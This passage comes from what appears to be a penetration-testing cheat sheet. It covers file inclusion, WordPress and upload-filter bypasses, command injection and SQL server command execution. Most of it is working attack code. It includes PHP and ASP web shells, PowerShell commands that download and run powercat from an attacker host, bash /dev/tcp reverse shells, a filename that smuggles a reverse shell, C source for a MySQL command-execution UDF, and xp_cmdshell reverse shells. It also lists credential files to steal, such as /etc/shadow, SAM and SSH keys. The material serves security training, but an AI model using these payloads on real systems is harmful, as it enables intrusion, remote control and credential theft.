                <li><strong>Perform Remote File Inclusion</strong>:</li>
              </ol>
              <pre><code class="language-bash">curl &quot;http://&lt;TARGET&gt;/index.php?page=http://&lt;ATTACKER_IP&gt;/revshell.php&amp;cmd=ls&quot;
</code></pre>
              <h4 id="333-wordpress-plugin-for-reverse-shell">3.3.3 WordPress Plugin for Reverse Shell</h4>
              <p>If you gain access to an admin WordPress panel, you can navigate to <strong>Theme &gt; Appearance &gt;
                  Editor &gt; 404 Template</strong>. There, you can modify the PHP code to include your malicious web
                shell. For example, refer to Section 3.3.3.3 for the code that allows you to access the shell at:
                <code>http://[IP]/[cms-path]/wp-content/nonexistent?cmd=[command]</code>.
              </p>
              <p>Alternatively, you can use the payload <code>multi-os-php-reverse-shell.php</code>, which automatically
                triggers a reverse shell when accessed. For a more complex approach, you could use a GitHub tool to
                create a malicious plugin, upload it, and obtain the reverse shell, as described in the below Sections
                3.3.3.1 and 3.3.3.2.</p>
              <h5 id="3331-malicious-wordpress-plugin-generators">3.3.3.1 Malicious WordPress Plugin Generators</h5>
              <ul>
                <li><a href="https://github.com/wetw0rk/malicious-wordpress-plugin" target="_blank">With Meterpreter</a>
                </li>
                <li><a href="https://github.com/Jsmoreira02/Pwn_Wordpress" target="_blank">Without Meterpreter</a></li>
              </ul>
              <h5 id="3332-reverse-shell-options">3.3.3.2 Reverse Shell Options</h5>
              <ul>
                <li><a href="https://rioasmara.com/2019/02/25/penetration-test-wordpress-reverse-shell/"
                    target="_blank">Two Reverse
                    Shell Options</a></li>
                <li><a href="https://pentaroot.com/exploit-wordpress-backdoor-theme-pages/" target="_blank">WordPress
                    Backdoor
                    Exploit</a></li>
              </ul>
              <h5 id="3333-php-webshell">3.3.3.3 PHP Webshell</h5>
              <pre><code class="language-php">&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;
</code></pre>
              <h5 id="3334-asp-webshell">3.3.3.4 ASP Webshell</h5>
              <pre><code class="language-asp">&lt;% eval request(&#39;cmd&#39;) %&gt;
</code></pre>
              <h5 id="3335-non-meterpreter-payload-for-netcat">3.3.3.5 Non-Meterpreter Payload for Netcat</h5>
              <pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt;
</code></pre>
              <h4 id="334-files-and-paths-to-target-lfi--rfi">3.3.4 Files and Paths to Target (LFI &amp; RFI)</h4>
              <h5 id="3341-common-linux-files">3.3.4.1 Common Linux Files</h5>
              <pre><code class="language-bash"># Popular Files
/etc/passwd                       # Contains user accounts
/etc/shadow                       # Stores hashed user passwords
/var/www/html/wp-config.php       # WordPress configuration
/proc/self/environ                # Environment variables (can contain session tokens)

# Additional Options
/etc/passwd
/etc/shadow
/etc/hosts
/home/&lt;user&gt;/.ssh/id_rsa
/home/&lt;user&gt;/.bash_history
/etc/apache2/sites-available/000-default.conf
/etc/httpd/logs/acces_log 
/etc/httpd/logs/error_log 
/var/www/logs/access_log 
/var/www/logs/access.log 
/usr/local/apache/logs/access_ log 
/usr/local/apache/logs/access. log 
/var/log/apache/access_log 
/var/log/apache2/access_log 
/var/log/apache/access.log 
/var/log/apache2/access.log
/var/log/access_log
/proc/self/environ
../wp-content/wp-config.php
/www/apache/conf/httpd.conf
</code></pre>
              <h5 id="3342-common-windows-files">3.3.4.2 Common Windows Files</h5>
              <pre><code class="language-bash"># Popular Files
C:\Windows\System32\drivers\etc\hosts          # Hosts file
C:\xampp\apache\logs\access.log                # Apache access logs
C:\xampp\php\php.ini                           # PHP configuration file
C:\Users\Administrator\NTUser.dat              # Windows user data
C:\Windows\System32\config\SAM                 # Security Account Manager database (passwords)
C:\Windows\System32\winevt\Logs\Security.evtx  # Security event logs

# Additional Options
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
</code></pre>
              <h4 id="335-php-wrappers">3.3.5 PHP Wrappers</h4>
              <ul>
                <li><strong><code>php://filter</code></strong></li>
              </ul>
              <pre><code class="language-bash">curl &quot;http://&lt;TARGET&gt;/index.php?page=php://filter/convert.base64-encode/resource=&lt;FILE&gt;&quot;

# Decode base64-encoded output
echo &quot;&lt;BASE64_ENCODED_OUTPUT&gt;&quot; | base64 -d
</code></pre>
              <ul>
                <li><strong><code>php://data</code></strong></li>
              </ul>
              <pre><code class="language-bash">curl &quot;http://&lt;TARGET&gt;/index.php?page=data://text/plain,&lt;PHP_PAYLOAD&gt;&quot;

# Encode PHP payload in base64:
echo -n &#39;&lt;?php echo system($_GET[&quot;cmd&quot;]); ?&gt;&#39; | base64
</code></pre>
              <h4 id="336-os-command-injection">3.3.6 OS Command Injection</h4>
              <ul>
                <li><strong>Detect Windows Commands Execution:</strong></li>
              </ul>
              <pre><code class="language-powershell">(dir 2&gt;&amp;1 *`|echo CMD);&amp;&lt;# rem #&gt;echo PowerShell
</code></pre>
              <ul>
                <li><strong>Download and Execute PowerCat Reverse Shell:</strong></li>
              </ul>
              <pre><code class="language-powershell">IEX (New-Object System.Net.Webclient).DownloadString(&quot;http://&lt;ATTACKER_IP&gt;/powercat.ps1&quot;);powercat -c &lt;ATTACKER_IP&gt; -p &lt;PORT&gt; -e powershell
</code></pre>
              <ul>
                <li><strong>Executing Command Injection:</strong></li>
              </ul>
              <pre><code class="language-bash">curl -X POST --data &#39;Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F&lt;ATTACKER_IP&gt;%2Fpowercat.ps1%22)%3Bpowercat%20-c%20&lt;ATTACKER_IP&gt;%20-p%20&lt;PORT&gt;%20-e%20powershell&#39; http://&lt;TARGET&gt;:&lt;PORT&gt;/archive
</code></pre>
              <h3 id="34-file-upload">3.4 File Upload</h3>
              <p>This vulnerability occurs in web applications where users can upload files without security checks to
                prevent potential dangers. This allows an attacker to upload files with code (such
                as <code>.php</code> or <code>.aspx</code> scripts) and execute them on the server.</p>
              <h4 id="341-disabling-frontend-validation">3.4.1 Disabling Frontend Validation</h4>
              <p><strong>Options</strong>:</p>
              <ol>
                <li>
                  <p>Use the <em>Browser Inspector</em> to find the function that validates the file, delete it and then
                    upload the file, keep in mind that this will not work if the validation is at server-level.</p>
                </li>
                <li>
                  <p>Use <em>BurpSuite</em> and send a normal request, intercept it and then modify it to our malicious
                    form and then send it.</p>
                </li>
              </ol>
              <h4 id="342-extensions-blacklist">3.4.2 Extensions Blacklist</h4>
              <p>Keep in mind that for Windows Servers file extensions are <strong>case sensitive</strong>, a wordlist
                we can use for fuzzing extension with either <code>ffuf</code> or <code>BurpSuite</code> (do not do URL
                encode) is <a
                  href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt">https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt</a>.
              </p>
              <pre><code class="language-txt">.jpeg.php
.jpg.php
.png.php
.php
.php3
.php4
.php5
.php7
.php8
.pht
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg
</code></pre>
              <h4 id="343-extensions-whitelist">3.4.3 Extensions Whitelist</h4>
              <p>We can perform a fuzzing or use a script to find if there is a whitelist of file extensions.</p>
              <pre><code class="language-bash"># This only checks if the whitelist are there in the file upload and not if it ends with it.
$fileName = basename($_FILES[&quot;uploadFile&quot;][&quot;name&quot;]);

if (!preg_match(&#39;^.*\.(jpg|jpeg|png|gif)&#39;, $fileName)) {
    echo &quot;Only images are allowed&quot;;
    die();
}
</code></pre>
              <h4 id="344-bypassing-filters">3.4.4 Bypassing Filters</h4>
              <p>We have different options to do so:</p>
              <ol>
                <li><strong>Changing File Extensions</strong>: if direct upload of .php files is restricted or filtered,
                  try alternative extensions that might bypass filters.</li>
              </ol>
              <pre><code class="language-plaintext"># For PHP
.pHP, .phps, .php7, .php4, .php5, .php3, .xxx

# For ASP(X)
.aspx, .asp, .ashx, .asmx
</code></pre>
              <ol start="2">
                <li><strong>Use <code>.htaccess</code></strong>: if the application allows <code>.htaccess</code> file
                  uploads, you can exploit it to change file handling settings:
                  <code>AddType application/x-httpd-php .dork</code>; then, upload a file with the <code>.dork</code>
                  extension, which might be interpreted as PHP and could contain a reverse shell or web shell.
                </li>
              </ol>
              <pre><code class="language-bash"># We can now upload [file].dork files.
echo &quot;AddType application/x-httpd-php .dork&quot; &gt; .htaccess
</code></pre>
              <ol start="3">
                <li><strong>Double Extension</strong>: upload files with double extensions like
                  <code>shell.php.jpg</code> or <code>shell.php.jpeg</code> to bypass simple filters.
                </li>
              </ol>
              <pre><code class="language-bash"># This checks if it ends with it so double extension wont work.
if (!preg_match(&#39;/^.*\.(jpg|jpeg|png|gif)$/&#39;, $fileName)) { ...SNIP... }
</code></pre>
              <ol start="4">
                <li><strong>Characters Injection</strong>: try using null byte injection to bypass filters, e.g.,
                  <code>shell.php%00.jpg</code>; or inject characters before or after the final extension:
                </li>
              </ol>
              <pre><code class="language-txt"># For example shell.php%00.jpg works with PHP servers with version 5.X or earlier, as it causes the PHP web server to end the file name after the &#39;%00&#39;, and store it as &#39;shell.php&#39;.
%20
%0a
%00
%0d0a
/
.\
.
‚Ä¶
:
</code></pre>
              <pre><code class="language-bash"># Script for all permutations
for char in &#39;%20&#39; &#39;%0a&#39; &#39;%00&#39; &#39;%0d0a&#39; &#39;/&#39; &#39;.\\&#39; &#39;.&#39; &#39;‚Ä¶&#39; &#39;:&#39;; do
    for ext in &#39;.php&#39; &#39;.php2&#39; &#39;.php3&#39; &#39;.php4&#39; &#39;.php5&#39; &#39;.php6&#39; &#39;.php7&#39; &#39;.phps&#39; &#39;.pht&#39; &#39;.phtm&#39; &#39;.phtml&#39; &#39;.pgif&#39; &#39;.phar&#39; &#39;.hphp&#39;; do
        echo &quot;shell$char$ext.jpg&quot; &gt;&gt; wordlist.txt
        echo &quot;shell$ext$char.jpg&quot; &gt;&gt; wordlist.txt
        echo &quot;shell.jpg$char$ext&quot; &gt;&gt; wordlist.txt
        echo &quot;shell.jpg$ext$char&quot; &gt;&gt; wordlist.txt
    done
done
</code></pre>
              <ol start="5">
                <li><strong>MIME (Multipurpose Internet Mail Extensions) Type Spoofing</strong>: use tools or manual
                  methods to alter the MIME type of the file being uploaded. Inspecting the initial bytes of a file
                  reveals its File Signature or Magic Bytes. For instance, (GIF87a or GIF89a) signifies a GIF image,
                  while plaintext indicates a Text file. Altering the initial bytes to the GIF magic bytes changes the
                  MIME type to a GIF image, disregarding its remaining content or <em>extension</em>. GIF images
                  uniquely start with ASCII printable bytes, making them easy to imitate. The string GIF8 is common to
                  both GIF signatures, simplifying GIF image imitation.</li>
              </ol>
              <pre><code class="language-php"># Payload code
GIF89a;
&lt;?
system($_GET[&#39;cmd&#39;]);//or you can insert your complete shell code
?&gt;
// or
GIF8
&lt;?
system($_GET[&#39;cmd&#39;]); //or you can insert your complete shell code
?&gt;
</code></pre>
              <pre><code class="language-bash"># Example
echo &quot;GIF8&quot; &gt; text.jpg 
file text.jpg

text.jpg: GIF image data

# Code to Test MIME type of uplaoded file
$type = mime_content_type($_FILES[&#39;uploadFile&#39;][&#39;tmp_name&#39;]);

if (!in_array($type, array(&#39;image/jpg&#39;, &#39;image/jpeg&#39;, &#39;image/png&#39;, &#39;image/gif&#39;))) {
    echo &quot;Only images are allowed&quot;;
    die();
}
</code></pre>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/php_filters01.png" class="img-fluid" alt="MIME Spoofing">
                  <figcaption class="figure-caption text-center">MIME Spoofing</figcaption>
                </figure>
              </div>
              <h4 id="345-file-execution">3.4.5 File Execution</h4>
              <p>This is a very important step because if we have successfully upload a webshell or a malicious file
                <strong>we want to be able to execute it</strong> to get a reverse shell or execute our malicious code.
              </p>
              <p>For this <strong>attempt to access uploaded files via URL</strong>, and ensure the uploaded file is
                executed in a web-accessible directory. If we want to get a reverse shell check the Utilities Section
                for commands, or use <a href="https://revshells.com/" target="_blank">https://revshells.com/</a>.</p>
              <pre><code class="language-bash">http://[TARGET_IP]/uploads/shell.php
or
http://[TARGET_IP]/uploads/shell.php?cmd=whoami
</code></pre>
              <h4 id="346-embed-code-into-images">3.4.6 Embed Code into Images</h4>
              <p>We can use <code>exiftool</code> for this, then we just need to rename it.</p>
              <pre><code class="language-bash">exiftool -Comment=&#39;&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[&#39;cmd&#39;]); ?&gt;&#39; lo.jpg

mv lo.jpg lo.php.jpg
</code></pre>
              <h4 id="347-embed-code-into-file-names">3.4.7 Embed Code into File Names</h4>
              <p>A common file upload attack uses a malicious string for the uploaded file name, which may get executed
                or processed if the uploaded file name is displayed on the page, or directly executed in the server.</p>
              <p>For example, if we name a file <code>file$(whoami).jpg</code> or file<code>whoami.jpg</code> or
                <code>file.jpg||whoami</code>, and then the web application attempts to move the uploaded file with an
                OS command (e.g. mv file /tmp), then our file name would inject the whoami command, which would get
                executed, leading to remote code execution.
              </p>
              <pre><code class="language-shell"># Crate the Base64 encoded command.
echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.45.166/444 0&gt;&amp;1&quot; | base64

# Download any normal image, and give it the name: cat.jpg.
cp cat.jpg &rsquo;|smile‚Äù`echo &lt;base64_bash_reverse_shell&gt; | base64 -d | bash`‚Äù.jpg&rsquo;
</code></pre>
              <h3 id="35-sql-attacks">3.5 SQL Attacks</h3>
              <h4 id="351-tools-for-connecting-usage">3.5.1 Tools for Connecting Usage</h4>
              <h5 id="3511-mysql-for-mysql-linux">3.5.1.1 <code>MySQL</code> for MySQL (Linux)</h5>
              <h6 id="35111-initial-connection">3.5.1.1.1 Initial Connection</h6>
              <p>If you have MySQL credentials:</p>
              <pre><code class="language-bash">mysql -u &lt;username&gt; -p -h &lt;host&gt;

# Then, provide the password when prompted.
</code></pre>
              <h6 id="35112-common-queries">3.5.1.1.2 Common Queries</h6>
              <ul>
                <li><strong>Check MySQL Version:</strong></li>
              </ul>
              <pre><code class="language-sql">SELECT VERSION();
</code></pre>
              <ul>
                <li><strong>List All Databases:</strong></li>
              </ul>
              <pre><code class="language-sql">SHOW DATABASES;
</code></pre>
              <ul>
                <li><strong>Switch to a Specific Database:</strong></li>
              </ul>
              <pre><code class="language-sql">USE &lt;database_name&gt;;
</code></pre>
              <h6 id="35113-enumerating-tables-and-columns">3.5.1.1.3 Enumerating Tables and Columns</h6>
              <ul>
                <li><strong>List All Tables in the Current Database:</strong></li>
              </ul>
              <pre><code class="language-sql">SHOW TABLES;
</code></pre>
              <ul>
                <li><strong>List All Columns in a Specific Table:</strong></li>
              </ul>
              <pre><code class="language-sql">SHOW COLUMNS FROM &lt;table_name&gt;;
</code></pre>
              <h6 id="35114-user-enumeration-and-privileges">3.5.1.1.4 User Enumeration and Privileges</h6>
              <ul>
                <li><strong>List All Users:</strong></li>
              </ul>
              <pre><code class="language-sql">SELECT User, Host FROM mysql.user;
</code></pre>
              <ul>
                <li><strong>Check User Privileges:</strong></li>
              </ul>
              <pre><code class="language-sql">SHOW GRANTS FOR &#39;&lt;username&gt;&#39;@&#39;&lt;host&gt;&#39;;
</code></pre>
              <h6 id="35115-data-extraction">3.5.1.1.5 Data Extraction</h6>
              <ul>
                <li><strong>Extract Data from a Table:</strong></li>
              </ul>
              <pre><code class="language-sql">SELECT * FROM &lt;table_name&gt; LIMIT &lt;number_of_rows&gt;;
</code></pre>
              <h6 id="35116-command-execution-via-user-defined-functions-udfs">3.5.1.1.6 Command Execution via
                User-Defined
                Functions (UDFs)</h6>
              <p>In MySQL, command execution can be achieved via User-Defined Functions (UDFs), if applicable.
                Here&#39;s an example of how to upload a malicious shared object file to gain shell access:</p>
              <ol>
                <li><strong>Upload UDF library:</strong></li>
              </ol>
              <pre><code class="language-bash">mysql -u root -p -h &lt;host&gt; -e &quot;use mysql; create table foo(line blob); insert into foo values(load_file(&#39;/path/to/your/udf/lib_mysqludf_sys.so&#39;)); select * from foo into dumpfile &#39;/usr/lib/mysql/plugin/lib_mysqludf_sys.so&#39;;&quot;
</code></pre>
              <ol start="2">
                <li><strong>Create the UDF to execute system commands:</strong></li>
              </ol>
              <pre><code class="language-sql">CREATE FUNCTION sys_exec RETURNS INT SONAME &#39;lib_mysqludf_sys.so&#39;;
</code></pre>
              <ol start="3">
                <li><strong>Execute Commands:</strong></li>
              </ol>
              <pre><code class="language-sql">SELECT sys_exec(&#39;id&#39;);
</code></pre>
              <h6 id="35117-reverse-shell">3.5.1.1.7 Reverse Shell</h6>
              <p><strong>If you can execute commands via UDF or another method</strong>, you can establish a reverse
                shell:</p>
              <ol>
                <li><strong>Set up a listener on your machine</strong>:</li>
              </ol>
              <pre><code class="language-bash">nc -lvnp 4444
</code></pre>
              <ol start="2">
                <li><strong>Use the following MySQL command to initiate the reverse shell</strong>:</li>
              </ol>
              <pre><code class="language-sql">SELECT sys_exec(&#39;bash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/4444 0&gt;&amp;1&#39;);
</code></pre>
              <h6 id="35118-where-to-get-your-so-for-udf">3.5.1.1.8 Where to Get Your <code>.so</code> for UDF</h6>
              <p>To perform the command you&#39;re referencing, which aims to create and load a <strong>User Defined
                  Function (UDF)</strong> into MySQL by injecting a <code>.so</code> file, you typically need to either:
              </p>
              <ol>
                <li><strong>Compile your own <code>.so</code> file</strong> that contains the malicious function (or any
                  other intended functionality).</li>
                <li><strong>Use an existing <code>.so</code> file</strong> already present on the system.</li>
              </ol>
              <p><strong>COMPILE YOUR OWN <code>.SO</code> FILE</strong>
                If you want to create your own <code>.so</code> file (such as a UDF for MySQL), follow these steps:</p>
              <ol>
                <li><strong>Write the UDF Code</strong>: you need a <code>.c</code> file that contains the code for your
                  UDF. For instance, if you&#39;re compiling the <code>lib_mysqludf_sys.so</code> library (which allows
                  you to execute system commands), you need the source code for it; here&rsquo;s an example of how to
                  create
                  this file:</li>
              </ol>
              <pre><code class="language-c">// lib_mysqludf_sys.c

#include &lt;my_global.h&gt;
#include &lt;my_sys.h&gt;
#include &lt;mysql.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message);
void sys_exec_deinit(UDF_INIT *initid);
long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error);

// Initialization function for UDF
my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
    if (args-&gt;arg_count != 1 || args-&gt;arg_type[0] != STRING_RESULT) {
        strcpy(message, &quot;sys_exec() requires exactly one string argument&quot;);
        return 1;
    }
    return 0;
}

// Cleanup function for UDF
void sys_exec_deinit(UDF_INIT *initid) {
    // Nothing to do
}

// Execution function
long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
    const char *command = args-&gt;args[0];
    return system(command);
}
</code></pre>
              <ol start="2">
                <li><strong>Compile the <code>.so</code> File</strong>: once you have the UDF code, you can compile it
                  into a shared object (<code>.so</code>) file. You&rsquo;ll need the <code>mysql-server-dev</code>
                  package to
                  get the necessary header files.</li>
              </ol>
              <pre><code class="language-bash">sudo apt install mysql-server-dev libmysqlclient-dev

# Compile the source code into a .so file; the resulting lib_mysqludf_sys.so file can now be used.
gcc -Wall -fPIC -I/usr/include/mysql -shared -o lib_mysqludf_sys.so lib_mysqludf_sys.c -lc

# -fPIC: Generates position-independent code (required for shared objects).
# -shared: Tells the compiler to generate a shared library.
# -I/usr/include/mysql: Includes MySQL development headers. 
</code></pre>
              <ol start="3">
                <li><strong>Inject the <code>.so</code> File into MySQL</strong>: after compiling the <code>.so</code>
                  file, you can inject it into the MySQL database using the SQL command you provided.</li>
              </ol>
              <pre><code class="language-bash">mysql -u root -p -h &lt;host&gt; -e &quot;USE mysql; 
CREATE TABLE foo(line BLOB); 
INSERT INTO foo VALUES (LOAD_FILE(&#39;/path/to/your/udf/lib_mysqludf_sys.so&#39;)); 
SELECT * FROM foo INTO DUMPFILE &#39;/usr/lib/mysql/plugin/lib_mysqludf_sys.so&#39;;&quot;
</code></pre>
              <ol start="4">
                <li><strong>Register the UDF in MySQL</strong>: once the <code>.so</code> file is injected, register the
                  function in MySQL.</li>
              </ol>
              <pre><code class="language-sql">CREATE FUNCTION sys_exec RETURNS INTEGER SONAME &#39;lib_mysqludf_sys.so&#39;;
</code></pre>
              <ol start="5">
                <li><strong>Execute system commands directly from MySQL using</strong>:</li>
              </ol>
              <pre><code class="language-sql">SELECT sys_exec(&#39;id&#39;);
</code></pre>
              <p><strong>USE AN EXISTING <code>.SO</code> FILE</strong>
                If you already have a <code>.so</code> file on the system, such as <code>lib_mysqludf_sys.so</code>, you
                can directly reference it in your command. In that case, you don&rsquo;t need to compile the file
                yourself.
                Simply adjust the SQL command as follows:</p>
              <pre><code class="language-bash"># Ensure that the .so file has the proper permissions and path to be loaded correctly by MySQL.
mysql -u root -p -h &lt;host&gt; -e &quot;USE mysql; 
CREATE TABLE foo(line BLOB); 
INSERT INTO foo VALUES (LOAD_FILE(&#39;/path/to/existing/lib_mysqludf_sys.so&#39;)); 
SELECT * FROM foo INTO DUMPFILE &#39;/usr/lib/mysql/plugin/lib_mysqludf_sys.so&#39;;&quot;
</code></pre>
              <h5 id="3512-mssqlclient-for-mssql-windows">3.5.1.2 <code>Mssqlclient</code> for MSSQL (Windows)</h5>
              <h6 id="35121-initial-connection">3.5.1.2.1 Initial Connection</h6>
              <pre><code class="language-bash"># Tip: you can also specify a domain by using &lt;domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;host&gt;.
impacket-mssqlclient &lt;username&gt;:&lt;password&gt;@&lt;host&gt; -windows-auth
</code></pre>
              <h6 id="35122-common-queries">3.5.1.2.2 Common Queries</h6>
              <ul>
                <li><strong>Check SQL Server Version:</strong></li>
              </ul>
              <pre><code class="language-sql">SELECT @@version;
</code></pre>
              <ul>
                <li><strong>List All Databases:</strong></li>
              </ul>
              <pre><code class="language-sql">SELECT name FROM sys.databases;
</code></pre>
              <ul>
                <li><strong>Switch to a Specific Database:</strong></li>
              </ul>
              <pre><code class="language-sql">USE &lt;database_name&gt;;
</code></pre>
              <h6 id="35123-enumerating-tables-and-columns">3.5.1.2.3 Enumerating Tables and Columns</h6>
              <ul>
                <li><strong>List All Tables in a Database:</strong></li>
              </ul>
              <pre><code class="language-sql"># Tip: replace &lt;schema&gt; with the actual schema name (commonly dbo).
SELECT table_name FROM &lt;schema&gt;.information_schema.tables;
</code></pre>
              <ul>
                <li><strong>List All Columns in a Specific Table:</strong></li>
              </ul>
              <pre><code class="language-sql">SELECT column_name FROM &lt;schema&gt;.information_schema.columns WHERE table_name = &#39;&lt;table_name&gt;&#39;;
</code></pre>
              <h6 id="35124-user-enumeration-and-privileges">3.5.1.2.4 User Enumeration and Privileges</h6>
              <ul>
                <li><strong>List All Users in a Database:</strong></li>
              </ul>
              <pre><code class="language-sql">SELECT * FROM &lt;schema&gt;.dbo.sysusers;
</code></pre>
              <ul>
                <li><strong>Check User Privileges:</strong></li>
              </ul>
              <pre><code class="language-sql">SELECT * FROM &lt;schema&gt;.sys.database_permissions WHERE grantee_principal_id = (SELECT principal_id FROM &lt;schema&gt;.sys.database_principals WHERE name = &#39;&lt;username&gt;&#39;);
</code></pre>
              <h6 id="35125-data-extraction">3.5.1.2.5 Data Extraction</h6>
              <ul>
                <li><strong>Extract Data from a Table:</strong></li>
              </ul>
              <pre><code class="language-sql">SELECT * FROM &lt;schema&gt;.&lt;table_name&gt; LIMIT &lt;number_of_rows&gt;;
</code></pre>
              <h6 id="35126-commands-execution">3.5.1.2.6 Commands Execution</h6>
              <ul>
                <li><strong>Enable xp_cmdshell (if permissions allow):</strong></li>
              </ul>
              <pre><code class="language-sql">EXEC sp_configure &#39;show advanced options&#39;, 1;
RECONFIGURE;
EXEC sp_configure &#39;xp_cmdshell&#39;, 1;
RECONFIGURE;
</code></pre>
              <ul>
                <li><strong>Execute OS Command:</strong></li>
              </ul>
              <pre><code class="language-sql">EXEC xp_cmdshell &#39;whoami&#39;;
</code></pre>
              <ul>
                <li><strong>Reverse Shell via <code>xp_cmdshell</code></strong>: if <code>xp_cmdshell</code> is enabled,
                  you can establish a reverse shell back to your machine. First, set up a listener on your machine:</li>
              </ul>
              <pre><code class="language-bash"># Setup the listener
nc -lvnp 4444

# Start your HTTP Server
python3 -m http.server 80

# Then, use the following reverse shell command on the SQL server (Windows system):
# To download a payload
EXEC xp_cmdshell &#39;powershell -NoP -NonI -W Hidden -Exec Bypass -Command &quot;iex(New-Object Net.WebClient).DownloadString(&#39;&#39;http://&lt;attacker_ip&gt;/shell.ps1&#39;&#39;)&quot;&#39;;

# Alternative Netcat-based payload
EXEC xp_cmdshell &#39;powershell -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;&#39;http://&lt;attacker_ip&gt;/reverse.ps1&#39;&#39;)&quot;

# To get a direct reverse shell
EXEC xp_cmdshell &#39;powershell -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;&#39;&lt;attacker_ip&gt;&#39;&#39;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;&#39;PS &#39;&#39; + (pwd).Path + &#39;&#39;&gt; &#39;&#39;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()}&quot;&#39;;
</code></pre>
              <h5 id="3513-tips">3.5.1.3 Tips</h5>
              <ul>
                <li><strong>MSSQL vs. MySQL:</strong> MSSQL offers <code>xp_cmdshell</code> for command execution,
                  whereas MySQL often relies on UDF-based exploits or file uploads for system interaction.</li>
                <li><strong>Interactive Shells:</strong> Always attempt to establish a stable reverse shell after
                  gaining execution on either MSSQL or MySQL.</li>
              </ul>
              <h4 id="352-sql-injection">3.5.2 SQL Injection</h4>
              <h5 id="3521-common-sql-functions">3.5.2.1 Common SQL Functions</h5>
              <ul>
                <li><strong>MySQL</strong></li>
              </ul>
              <pre><code class="language-sql">LIMIT &lt;row offset&gt;, &lt;number of rows&gt;  -- Display rows based on offset and number
COUNT(*)                             -- Display number of rows
RAND()                               -- Generate random number between 0 and 1
FLOOR(RAND()*&lt;number&gt;)              -- Print out number part of random decimal number
SELECT (SELECT DATABASE());         -- Double query (nested) using DATABASE() as an example
GROUP BY &lt;column name&gt;              -- Summarize rows based on column name
